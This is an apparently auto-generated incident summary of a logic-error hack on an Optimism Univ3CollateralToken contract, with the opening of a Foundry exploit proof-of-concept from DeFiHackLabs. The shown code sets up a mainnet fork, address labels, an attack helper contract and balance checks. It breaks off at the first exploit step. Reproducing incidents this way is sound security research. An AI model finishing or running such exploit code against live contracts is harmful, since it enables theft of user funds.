# [?] Univ3CollateralToken - Logic Error

## Summary
Severity: Unknown
Chain: Optimism
Component: Univ3CollateralToken
Published: 2026-03-24
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/Univ3CollateralToken_exp.sol
Type: defi-exploit-poc

## Details
Lost: 57K USD

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 149_373_832;
        vm.createSelectFork("optimism", forkBlock);

        attacker = ATTACKER;
        multiAssetLog = true;
        _addFundingToken(OP_USDC);
        _addFundingToken(OP_USDC_E);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VULNERABLE_IMPLEMENTATION, "Univ3CollateralToken Implementation");
        vm.label(UNIV3_COLLATERAL_TOKEN, "Univ3CollateralToken Proxy");
        vm.label(VAULT_CONTROLLER, "VaultController Proxy");
        vm.label(USDI, "USDI Reserve");
        vm.label(OP_USDC, "USDC");
        vm.label(OP_USDC_E, "USDC.e");
        vm.label(OP_WETH, "WETH");

        InterestAttack helper = new InterestAttack();
        vm.etch(ATTACK_CONTRACT, address(helper).code);
    }

    function testExploit() public balanceLog {
        uint256 primaryReserveBefore = IERC20(OP_USDC).balanceOf(USDI);
        uint256 attackerUsdcBefore = IERC20(OP_USDC).balanceOf(ATTACKER);
        uint256 attackerUsdceBefore = IERC20(OP_USDC_E).balanceOf(ATTACKER);

        uint96[] memory vaultIds = IInterestVaultController(VAULT_CONTROLLER).vaultIDs(ATTACK_CONTRACT);
        assertEq(vaultIds.length, 30);
        assertEq(IUniv3CollateralToken(UNIV3_COLLATERAL_TOKEN).depositedPositions(ATTACK_CONTRACT).length, 0);

        // step 1: provide the same setup capital class used to mint the Uni V3 collateral NFT.
        uint256 seedWeth = 3 ether;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-03/Univ3CollateralToken_exp.sol_
